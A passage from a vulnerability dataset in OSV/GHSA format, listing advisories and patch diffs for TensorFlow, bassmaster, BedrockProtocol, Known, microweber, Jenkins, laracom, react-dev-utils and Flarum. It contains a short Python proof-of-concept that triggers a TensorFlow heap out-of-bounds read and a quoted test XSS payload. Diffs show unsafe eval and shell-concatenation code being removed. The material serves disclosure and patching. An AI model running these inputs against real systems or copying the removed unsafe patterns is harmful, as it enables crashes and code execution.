[implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/60a45c8b6192a4699f2e2709a2645a751d435cc3\/tensorflow\/core\/kernels\/sdca_internal.cc) does not validate that the user supplied arguments satisfy all [constraints expected by the op](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/SdcaOptimizer).\n\n### Patches\nWe have patched the issue in GitHub commit [f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb","commit_sha":"f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb","patch":"SINGLE","chain_ord":"['f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb']","before_first_fix_commit":"{'60a45c8b6192a4699f2e2709a2645a751d435cc3'}","last_fix_commit":"f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 18:40:50","message":"Add several missing validations in SDCA\n\nPiperOrigin-RevId: 372172877\nChange-Id: Id366da962432e18dcbfac847d11e98488bebb70a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 36, 'deletions': 0, 'total': 36}","files":"{'tensorflow\/core\/kernels\/sdca_internal.cc': {'additions': 36, 'deletions': 0, 'changes': 36, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb\/tensorflow%2Fcore%2Fkernels%2Fsdca_internal.cc', 'patch': '@@ -99,17 +99,31 @@ Status ModelWeights::Initialize(OpKernelContext* const context) {\\n   OpInputList sparse_weights_inputs;\\n   TF_RETURN_IF_ERROR(\\n       context->input_list(\"sparse_weights\", &sparse_weights_inputs));\\n+  if (sparse_indices_inputs.size() != sparse_weights_inputs.size())\\n+    return errors::InvalidArgument(\\n+        \"sparse_indices and sparse_weights must have the same length, got \",\\n+        sparse_indices_inputs.size(), \" and \", sparse_weights_inputs.size());\\n   OpInputList dense_weights_inputs;\\n   TF_RETURN_IF_ERROR(\\n       context->input_list(\"dense_weights\", &dense_weights_inputs));\\n \\n   OpOutputList sparse_weights_outputs;\\n   TF_RETURN_IF_ERROR(context->output_list(\"out_delta_sparse_weights\",\\n                                           &sparse_weights_outputs));\\n+  if (sparse_weights_outputs.size() != sparse_weights_inputs.size())\\n+    return errors::InvalidArgument(\\n+        \"out_delta_sparse_weights and sparse_weights must have the same \"\\n+        \"length, got \",\\n+        sparse_weights_outputs.size(), \" and \", sparse_weights_inputs.size());\\n \\n   OpOutputList dense_weights_outputs;\\n   TF_RETURN_IF_ERROR(\\n       context->output_list(\"out_delta_dense_weights\", &dense_weights_outputs));\\n+  if (dense_weights_outputs.size() != dense_weights_inputs.size())\\n+    return errors::InvalidArgument(\\n+        \"out_delta_dense_weights and dense_weights must have the same length, \"\\n+        \"got \",\\n+        dense_weights_outputs.size(), \" and \", dense_weights_inputs.size());\\n \\n   for (int i = 0; i < sparse_weights_inputs.size(); ++i) {\\n     Tensor* delta_t;\\n@@ -327,13 +341,28 @@ Status Examples::Initialize(OpKernelContext* const context,\\n   OpInputList sparse_example_indices_inputs;\\n   TF_RETURN_IF_ERROR(context->input_list(\"sparse_example_indices\",\\n                                          &sparse_example_indices_inputs));\\n+  if (sparse_example_indices_inputs.size() != num_sparse_features)\\n+    return errors::InvalidArgument(\\n+        \"Expected \", num_sparse_features,\\n+        \" tensors in sparse_example_indices but got \",\\n+        sparse_example_indices_inputs.size());\\n   OpInputList sparse_feature_indices_inputs;\\n   TF_RETURN_IF_ERROR(context->input_list(\"sparse_feature_indices\",\\n                                          &sparse_feature_indices_inputs));\\n+  if (sparse_feature_indices_inputs.size() != num_sparse_features)\\n+    return errors::InvalidArgument(\\n+        \"Expected \", num_sparse_features,\\n+        \" tensors in sparse_feature_indices but got \",\\n+        sparse_feature_indices_inputs.size());\\n   OpInputList sparse_feature_values_inputs;\\n   if (num_sparse_features_with_values > 0) {\\n     TF_RETURN_IF_ERROR(context->input_list(\"sparse_feature_values\",\\n                                            &sparse_feature_values_inputs));\\n+    if (sparse_feature_values_inputs.size() != num_sparse_features_with_values)\\n+      return errors::InvalidArgument(\\n+          \"Expected \", num_sparse_features_with_values,\\n+          \" tensors in sparse_feature_values but got \",\\n+          sparse_feature_values_inputs.size());\\n   }\\n \\n   const Tensor* example_weights_t;\\n@@ -400,6 +429,13 @@ Status Examples::CreateSparseFeatureRepresentation(\\n           sparse_example_indices_inputs[i].template flat<int64>();\\n       auto feature_indices =\\n           sparse_feature_indices_inputs[i].template flat<int64>();\\n+      if (example_indices.size() != feature_indices.size()) {\\n+        mutex_lock l(mu);\\n+        result = errors::InvalidArgument(\\n+            \"Found mismatched example_indices and feature_indices [\",\\n+            example_indices, \"] vs [\", feature_indices, \"]\");\\n+        return;\\n+      }\\n \\n       \/\/ Parse features for each example. Features for a particular example\\n       \/\/ are at the offsets (start_id, end_id]'}}","message_norm":"add several missing validations in sdca\n\npiperorigin-revid: 372172877\nchange-id: id366da962432e18dcbfac847d11e98488bebb70a","language":"en","entities":"[('add', 'ACTION', ''), ('missing validations', 'SECWORD', ''), ('372172877', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sdca_internal.cc'])","num_files":1.0},{"index":642,"vuln_id":"GHSA-5hj3-vjjf-f5m7","cwe_id":"{'CWE-125'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e138660270e7599793fa438cd7b2fc2ce215a6'}","dataset":"osv","summary":"Heap OOB in `SdcaOptimizerV2` ### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SdcaOptimizerV2(\n  sparse_example_indices=[[1]],\n  sparse_feature_indices=[[1]],\n  sparse_feature_values=[[1.0,2.0]],\n  dense_features=[[1.0]],\n  example_weights=[1.0],\n  example_labels=[],\n  sparse_indices=[1],\n  sparse_weights=[1.0],\n  dense_weights=[[1.0]],\n  example_state_data=[[100.0,100.0,100.0,100.0]],\n  loss_type='logistic_loss',\n  l1=100.0,\n  l2=100.0,\n  num_loss_partitions=1,\n  num_inner_iterations=1,\n  adaptive=True)       \n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.\n\n### Patches\nWe have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e138660270e7599793fa438cd7b2fc2ce215a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e138660270e7599793fa438cd7b2fc2ce215a6","commit_sha":"a4e138660270e7599793fa438cd7b2fc2ce215a6","patch":"SINGLE","chain_ord":"['a4e138660270e7599793fa438cd7b2fc2ce215a6']","before_first_fix_commit":"{'578e634b4f1c1c684d4b4294f9e5281b2133b3ed'}","last_fix_commit":"a4e138660270e7599793fa438cd7b2fc2ce215a6","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:24:27","message":"Add remaining validation to `sdca_internal.cc`\n\nPiperOrigin-RevId: 387738010\nChange-Id: I28eedcfd87a53aaf34deb075acea1f8c95470808","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sdca_internal.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a4e138660270e7599793fa438cd7b2fc2ce215a6\/tensorflow%2Fcore%2Fkernels%2Fsdca_internal.cc', 'patch': '@@ -380,6 +380,11 @@ Status Examples::Initialize(OpKernelContext* const context,\\n   const Tensor* example_labels_t;\\n   TF_RETURN_IF_ERROR(context->input(\"example_labels\", &example_labels_t));\\n   auto example_labels = example_labels_t->flat<float>();\\n+  if (example_labels.size() != num_examples) {\\n+    return errors::InvalidArgument(\"Expected \", num_examples,\\n+                                   \" example labels but got \",\\n+                                   example_labels.size());\\n+  }\\n \\n   OpInputList dense_features_inputs;\\n   TF_RETURN_IF_ERROR('}}","message_norm":"add remaining validation to `sdca_internal.cc`\n\npiperorigin-revid: 387738010\nchange-id: i28eedcfd87a53aaf34deb075acea1f8c95470808","language":"en","entities":"[('add', 'ACTION', ''), ('387738010', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sdca_internal.cc'])","num_files":1.0},{"index":646,"vuln_id":"GHSA-5j3g-jfq3-7jwx","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/hapijs\/bassmaster\/commit\/b751602d8cb7194ee62a61e085069679525138c4'}","dataset":"osv","summary":"Arbitrary JavaScript Execution in bassmaster A vulnerability exists in bassmaster <= 1.5.1 that allows for an attacker to provide arbitrary JavaScript that is then executed server side via eval.\n\n\n## Recommendation\n\nUpdate to bassmaster version 1.5.2 or greater.","published_date":"2017-10-24","chain_len":1,"project":"https:\/\/github.com\/hapijs\/bassmaster","commit_href":"https:\/\/github.com\/hapijs\/bassmaster\/commit\/b751602d8cb7194ee62a61e085069679525138c4","commit_sha":"b751602d8cb7194ee62a61e085069679525138c4","patch":"SINGLE","chain_ord":"['b751602d8cb7194ee62a61e085069679525138c4']","before_first_fix_commit":"{'83f02417beab924ce2fe6ee7d6fcfab11d2dafd5'}","last_fix_commit":"b751602d8cb7194ee62a61e085069679525138c4","chain_ord_pos":1.0,"commit_datetime":"09\/25\/2014, 23:06:07","message":"Remove eval statement","author":"nvcexploder","comments":null,"stats":"{'additions': 2, 'deletions': 8, 'total': 10}","files":"{'lib\/batch.js': {'additions': 2, 'deletions': 8, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/outmoded\/bassmaster\/raw\/b751602d8cb7194ee62a61e085069679525138c4\/lib%2Fbatch.js', 'patch': \"@@ -146,16 +146,10 @@ internals.batch = function (batchRequest, resultsData, pos, parts, callback) {\\n             var ref = resultsData.resultsMap[parts[i].index];\\n \\n             if (ref) {\\n-                var value = null;\\n-\\n-                try {\\n-                    eval('value = ref.' + parts[i].value + ';');\\n-                }\\n-                catch (e) {\\n-                    error = new Error(e.message);\\n-                }\\n+                var value = ref[parts[i].value]||null;\\n \\n                 if (value) {\\n+\\n                     if (value.match && value.match(\/^[\\\\w:]+$\/)) {\\n                         path += value;\\n                     }\"}}","message_norm":"remove eval statement","language":"sl","entities":"[('remove', 'ACTION', ''), ('eval', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/batch.js'])","num_files":1.0},{"index":647,"vuln_id":"GHSA-5jfw-35xp-5m42","cwe_id":"{'CWE-124'}","score":7.5,"chain":"{'https:\/\/github.com\/pmmp\/BedrockProtocol\/commit\/e3fce7632b94e83fd6a518a87dcaf6a11681c4ac'}","dataset":"osv","summary":"Buffer length underflow in LoginPacket causing unchecked exceptions to be thrown ### Impact\n`LoginPacket` uses `BinaryStream->getLInt()` to read the lengths of JSON payloads it wants to decode. Unfortunately, `BinaryStream->getLInt()` returns a signed integer, meaning that a malicious client can craft a packet with a large uint32 value for payload buffer size (which would be interpreted as a negative signed int32), causing `BinaryStream->get()` to throw an exception.\n\nIn the context of PocketMine-MP, this leads to a server crash when the vulnerability is exploited.\n\n### Patches\ne3fce7632b94e83fd6a518a87dcaf6a11681c4ac\n\n### Workarounds\nThis can be worked around by registering a custom `LoginPacket` implementation into `PacketPool` which overrides [this code](https:\/\/github.com\/pmmp\/BedrockProtocol\/blob\/47532c95ea37d5f0365b23f734d70d943ff95295\/src\/LoginPacket.php#L54) to patch it.\n\n### For more information\n* Email us at [team@pmmp.io](mailto:team@pmmp.io)","published_date":"2022-04-05","chain_len":1,"project":"https:\/\/github.com\/pmmp\/BedrockProtocol","commit_href":"https:\/\/github.com\/pmmp\/BedrockProtocol\/commit\/e3fce7632b94e83fd6a518a87dcaf6a11681c4ac","commit_sha":"e3fce7632b94e83fd6a518a87dcaf6a11681c4ac","patch":"SINGLE","chain_ord":"['e3fce7632b94e83fd6a518a87dcaf6a11681c4ac']","before_first_fix_commit":"{'a740f6095b35278c0e0dac6db84a5e4d2456b113'}","last_fix_commit":"e3fce7632b94e83fd6a518a87dcaf6a11681c4ac","chain_ord_pos":1.0,"commit_datetime":"04\/01\/2022, 21:41:00","message":"LoginPacket: fixed buffer length underflow in payload decoding","author":"Dylan K. Taylor","comments":null,"stats":"{'additions': 14, 'deletions': 2, 'total': 16}","files":"{'src\/LoginPacket.php': {'additions': 14, 'deletions': 2, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pmmp\/BedrockProtocol\/raw\/e3fce7632b94e83fd6a518a87dcaf6a11681c4ac\/src%2FLoginPacket.php', 'patch': '@@ -54,7 +54,13 @@ protected function decodePayload(PacketSerializer $in) : void{\\n \\tprotected function decodeConnectionRequest(string $binary) : void{\\n \\t\\t$connRequestReader = new BinaryStream($binary);\\n \\n-\\t\\t$chainDataJson = json_decode($connRequestReader->get($connRequestReader->getLInt()));\\n+\\t\\t$chainDataJsonLength = $connRequestReader->getLInt();\\n+\\t\\tif($chainDataJsonLength <= 0){\\n+\\t\\t\\t\/\/technically this is always positive; the problem results because getLInt() is implicitly signed\\n+\\t\\t\\t\/\/this is inconsistent with many other methods, but we can\\'t do anything about that for now\\n+\\t\\t\\tthrow new PacketDecodeException(\"Length of chain data JSON must be positive\");\\n+\\t\\t}\\n+\\t\\t$chainDataJson = json_decode($connRequestReader->get($chainDataJsonLength));\\n \\t\\tif(!is_object($chainDataJson)){\\n \\t\\t\\tthrow new PacketDecodeException(\"Failed decoding chain data JSON: \" . json_last_error_msg());\\n \\t\\t}\\n@@ -68,7 +74,13 @@ protected function decodeConnectionRequest(string $binary) : void{\\n \\t\\t}\\n \\n \\t\\t$this->chainDataJwt = $chainData;\\n-\\t\\t$this->clientDataJwt = $connRequestReader->get($connRequestReader->getLInt());\\n+\\t\\t$clientDataJwtLength = $connRequestReader->getLInt();\\n+\\t\\tif($clientDataJwtLength <= 0){\\n+\\t\\t\\t\/\/technically this is always positive; the problem results because getLInt() is implicitly signed\\n+\\t\\t\\t\/\/this is inconsistent with many other methods, but we can\\'t do anything about that for now\\n+\\t\\t\\tthrow new PacketDecodeException(\"Length of clientData JWT must be positive\");\\n+\\t\\t}\\n+\\t\\t$this->clientDataJwt = $connRequestReader->get($clientDataJwtLength);\\n \\t}\\n \\n \\tprotected function encodePayload(PacketSerializer $out) : void{'}}","message_norm":"loginpacket: fixed buffer length underflow in payload decoding","language":"en","entities":"[('fixed', 'ACTION', ''), ('underflow', 'SECWORD', ''), ('decoding', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/LoginPacket.php'])","num_files":1.0},{"index":648,"vuln_id":"GHSA-5jgj-h9wp-53fr","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/idno\/known\/commit\/80b716a8392fb71cfce84d03aaf7c045c62f6350'}","dataset":"osv","summary":"Known vulnerable to code execution via SVG file in v1.3.1 An issue in the isSVG() function of Known v1.3.1 allows attackers to execute arbitrary code via a crafted SVG file.\n\nThe researcher report indicates that versions 1.3.1 and prior are vulnerable. Version 1.2.2 is the last version tagged on GitHub and in Packagist, and development related to the 1.3.x branch is currently on the `dev` branch of the idno\/known repository.","published_date":"2022-07-09","chain_len":1,"project":"https:\/\/github.com\/idno\/known","commit_href":"https:\/\/github.com\/idno\/known\/commit\/80b716a8392fb71cfce84d03aaf7c045c62f6350","commit_sha":"80b716a8392fb71cfce84d03aaf7c045c62f6350","patch":"SINGLE","chain_ord":"['80b716a8392fb71cfce84d03aaf7c045c62f6350']","before_first_fix_commit":"{'e86e779cf1db93cd488ee578e92a16008132a114'}","last_fix_commit":"80b716a8392fb71cfce84d03aaf7c045c62f6350","chain_ord_pos":1.0,"commit_datetime":"11\/18\/2021, 15:44:26","message":"Checking for script tags in GIFs etc (#3017)","author":"Ben Werdmuller","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'Idno\/Entities\/File.php': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/idno\/known\/raw\/80b716a8392fb71cfce84d03aaf7c045c62f6350\/Idno%2FEntities%2FFile.php', 'patch': \"@@ -285,6 +285,20 @@ public static function isImage($file_path)\\n             return false;\\n         }\\n \\n+        \/**\\n+         * Detects whether the file contains PHP or script tags, eg to check for embedded code in GIFs\\n+         * @param $file_path\\n+         * @return bool\\n+         *\/\\n+        public static function isFileFreeFromScriptTags($file_path)\\n+        {\\n+            if ($contents = file_get_contents($file_path)) {\\n+                if (stripos($contents, '<script') || strpos($contents, '<?')) return false;\\n+                return true;\\n+            }\\n+            return false;\\n+        }\\n+\\n         \/**\\n          * Retrieve a file by ID\\n          *\"}}","message_norm":"checking for script tags in gifs etc (#3017)","language":"en","entities":"[('#3017', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Idno\/Entities\/File.php'])","num_files":1.0},{"index":665,"vuln_id":"GHSA-5pg2-qg87-vmj7","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/9ebbb4dd35da74025ab6965f722829a7f8f86566'}","dataset":"osv","summary":"Cross-site Scripting in microweber Cross-site Scripting (XSS) - Stored in GitHub repository microweber\/microweber prior to 1.2.19.","published_date":"2022-07-02","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/9ebbb4dd35da74025ab6965f722829a7f8f86566","commit_sha":"9ebbb4dd35da74025ab6965f722829a7f8f86566","patch":"SINGLE","chain_ord":"['9ebbb4dd35da74025ab6965f722829a7f8f86566']","before_first_fix_commit":"{'c2991b3a44896320a834a4b611257db587129645'}","last_fix_commit":"9ebbb4dd35da74025ab6965f722829a7f8f86566","chain_ord_pos":1.0,"commit_datetime":"07\/01\/2022, 08:07:47","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'src\/MicroweberPackages\/App\/functions\/plupload.php': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/9ebbb4dd35da74025ab6965f722829a7f8f86566\/src%2FMicroweberPackages%2FApp%2Ffunctions%2Fplupload.php', 'patch': \"@@ -336,9 +336,12 @@\\n \/\/ Make sure the fileName is unique but only if chunking is disabled\\n if ($chunks < 2 && file_exists($targetDir . DIRECTORY_SEPARATOR . $fileName)) {\\n     $ext = strrpos($fileName, '.');\\n+\\n     $fileName_a = substr($fileName, 0, $ext);\\n     $fileName_b = substr($fileName, $ext);\\n \\n+    $fileName_b = strtolower($fileName_b);\\n+\\n     $count = 1;\\n     while (file_exists($targetDir . DIRECTORY_SEPARATOR . $fileName_a . '_' . $count . $fileName_b)) {\\n         ++$count;\\n@@ -500,7 +503,7 @@\\n \\n     if (is_file($filePath) and !$chunks || $chunk == $chunks - 1) {\\n         $ext = get_file_extension($filePath);\\n-\\n+        $ext = strtolower($ext);\\n         if (function_exists('finfo_open') and function_exists('finfo_file')) {\\n             $finfo = finfo_open(FILEINFO_MIME_TYPE); \/\/ return mime type ala mimetype extension\\n             $mime = @finfo_file($finfo, $filePath);\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/functions\/plupload.php'])","num_files":1.0},{"index":671,"vuln_id":"GHSA-5ppx-rgw2-xg23","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/f67068170b55633571e5462e52b6124b23d7cb84'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in Jenkins Jenkins 2.88 and earlier; 2.73.2 and earlier Autocompletion suggestions for text fields were not escaped, resulting in a persisted cross-site scripting vulnerability if the source for the suggestions allowed specifying text that includes HTML metacharacters like less-than and greater-than characters.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/f67068170b55633571e5462e52b6124b23d7cb84","commit_sha":"f67068170b55633571e5462e52b6124b23d7cb84","patch":"SINGLE","chain_ord":"['f67068170b55633571e5462e52b6124b23d7cb84']","before_first_fix_commit":"{'566a8ddb885f0bef9bc848e60455c0aabbf0c1d3'}","last_fix_commit":"f67068170b55633571e5462e52b6124b23d7cb84","chain_ord_pos":1.0,"commit_datetime":"10\/24\/2017, 16:01:03","message":"[SECURITY-641] Escape autocompletion suggestions","author":"Daniel Beck","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'war\/src\/main\/webapp\/scripts\/hudson-behavior.js': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/f67068170b55633571e5462e52b6124b23d7cb84\/war%2Fsrc%2Fmain%2Fwebapp%2Fscripts%2Fhudson-behavior.js', 'patch': '@@ -712,6 +712,7 @@ var jenkinsRules = {\\n         };\\n         ac.prehighlightClassName = \"yui-ac-prehighlight\";\\n         ac.animSpeed = 0;\\n+        ac.formatResult = ac.formatEscapedResult;\\n         ac.useShadow = true;\\n         ac.autoSnapContainer = true;\\n         ac.delimChar = e.getAttribute(\"autoCompleteDelimChar\");'}}","message_norm":"[security-641] escape autocompletion suggestions","language":"fr","entities":"[('security-641', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['war\/src\/main\/webapp\/scripts\/hudson-behavior.js'])","num_files":1.0},{"index":675,"vuln_id":"GHSA-5q5w-mqp6-g2gh","cwe_id":"{'CWE-434', 'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/jsdecena\/laracom\/commit\/256026193ce994dc4c1365e02f414d8a0cd77ae8'}","dataset":"osv","summary":"Unrestricted Upload of File with Dangerous Type in jsdecena\/laracom jsdecena\/laracom prior to version 2.0.9 is vulnerable to Unrestricted Upload of File with Dangerous Type.","published_date":"2022-02-06","chain_len":1,"project":"https:\/\/github.com\/jsdecena\/laracom","commit_href":"https:\/\/github.com\/jsdecena\/laracom\/commit\/256026193ce994dc4c1365e02f414d8a0cd77ae8","commit_sha":"256026193ce994dc4c1365e02f414d8a0cd77ae8","patch":"SINGLE","chain_ord":"['256026193ce994dc4c1365e02f414d8a0cd77ae8']","before_first_fix_commit":"{'8ef50622cb9c696d79a7a6b37e9b43266da6545d'}","last_fix_commit":"256026193ce994dc4c1365e02f414d8a0cd77ae8","chain_ord_pos":1.0,"commit_datetime":"02\/01\/2022, 22:16:55","message":"Fix vulnerability report from hunter.dev","author":"Roland Jeffrey Decena","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'project\/app\/Shop\/Products\/Requests\/UpdateProductRequest.php': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jsdecena\/laracom\/raw\/256026193ce994dc4c1365e02f414d8a0cd77ae8\/project%2Fapp%2FShop%2FProducts%2FRequests%2FUpdateProductRequest.php', 'patch': \"@@ -20,7 +20,9 @@ public function rules()\\n             'quantity' => ['required', 'integer', 'min:0'],\\n             'price' => ['required', 'numeric', 'min:0'],\\n             'sale_price' => ['nullable', 'numeric'],\\n-            'weight' => ['nullable', 'numeric', 'min:0']\\n+            'weight' => ['nullable', 'numeric', 'min:0'],\\n+            'image' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',\\n+            'cover' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',\\n         ];\\n     }\\n }\"}}","message_norm":"fix vulnerability report from hunter.dev","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['project\/app\/Shop\/Products\/Requests\/UpdateProductRequest.php'])","num_files":1.0},{"index":676,"vuln_id":"GHSA-5q6m-3h65-w53x","cwe_id":"{'CWE-78'}","score":5.6,"chain":"{'https:\/\/github.com\/facebook\/create-react-app\/commit\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268'}","dataset":"osv","summary":"react-dev-utils OS Command Injection in function `getProcessForPort` react-dev-utils prior to v11.0.4 exposes a function, `getProcessForPort`, where an input argument is concatenated into a command string to be executed. This function is typically used from react-scripts (in Create React App projects), where the usage is safe. Only when this function is manually invoked with user-provided values (ie: by custom code) is there the potential for command injection. If you're consuming it from react-scripts then this issue does not affect you.","published_date":"2021-03-11","chain_len":1,"project":"https:\/\/github.com\/facebook\/create-react-app","commit_href":"https:\/\/github.com\/facebook\/create-react-app\/commit\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268","commit_sha":"f5e415f3a5b66f07dcc60aba1b445fa7cda97268","patch":"SINGLE","chain_ord":"['f5e415f3a5b66f07dcc60aba1b445fa7cda97268']","before_first_fix_commit":"{'22f46a8d5dfc46fe0f613cd7efbc82344823f461'}","last_fix_commit":"f5e415f3a5b66f07dcc60aba1b445fa7cda97268","chain_ord_pos":1.0,"commit_datetime":"03\/08\/2021, 19:03:16","message":"Security Fix for Command Injection - huntr.dev (#10644)\n\n* Update getProcessForPort.js\r\n\r\n* Update getProcessForPort.js\r\n\r\nCo-authored-by: Zhou Peng <zpbrent@gmail.com>\r\nCo-authored-by: Dan Abramov <dan.abramov@gmail.com>","author":"huntr.dev | the place to protect open source","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'packages\/react-dev-utils\/getProcessForPort.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facebook\/create-react-app\/raw\/f5e415f3a5b66f07dcc60aba1b445fa7cda97268\/packages%2Freact-dev-utils%2FgetProcessForPort.js', 'patch': \"@@ -9,6 +9,7 @@\\n \\n var chalk = require('chalk');\\n var execSync = require('child_process').execSync;\\n+var execFileSync = require('child_process').execFileSync;\\n var path = require('path');\\n \\n var execOptions = {\\n@@ -25,7 +26,7 @@ function isProcessAReactApp(processCommand) {\\n }\\n \\n function getProcessIdOnPort(port) {\\n-  return execSync('lsof -i:' + port + ' -P -t -sTCP:LISTEN', execOptions)\\n+  return execFileSync('lsof', ['-i:' + port, '-P', '-t', '-sTCP:LISTEN'], execOptions)\\n     .split('\\\\n')[0]\\n     .trim();\\n }\"}}","message_norm":"security fix for command injection - huntr.dev (#10644)\n\n* update getprocessforport.js\r\n\r\n* update getprocessforport.js\r\n\r\nco-authored-by: zhou peng <zpbrent@gmail.com>\r\nco-authored-by: dan abramov <dan.abramov@gmail.com>","language":"en","entities":"[('security', 'SECWORD', ''), ('command injection', 'SECWORD', ''), ('#10644', 'ISSUE', ''), ('zpbrent@gmail.com', 'EMAIL', ''), ('dan.abramov@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/react-dev-utils\/getProcessForPort.js'])","num_files":1.0},{"index":682,"vuln_id":"GHSA-5qjq-69w6-fg57","cwe_id":"{'CWE-79'}","score":10.0,"chain":"{'https:\/\/github.com\/flarum\/core\/commit\/440bed81b8019dff00642c8f493b4909d505a28a'}","dataset":"osv","summary":"XSS vulnerability with translator Flarum's translation system allowed for string inputs to be converted into HTML DOM nodes when rendered. This change was made after v0.1.0-beta.16 (our last beta before v1.0.0) and was not noticed or documented.\n\nThis allowed for any user to type malicious HTML markup within certain user input fields and have this execute on client browsers. The example which led to the discovery of this vulnerability was in the forum search box. Entering faux-malicious HTML markup, such as <script>alert('test')<\/script> resulted in an alert box appearing on the forum. This attack could also be modified to perform AJAX requests on behalf of a user, possibly deleting discussions, modifying their settings or profile, or even modifying settings on the Admin panel if the attack was targetted towards a privileged user.\n\n### Impact\n\nAll Flarum communities that run flarum v1.0.0 or v1.0.1 are impacted.\n\n### Patches\n\nThe vulnerability has been fixed and published as flarum\/core v1.0.2. All communities running Flarum v1.0 have to upgrade 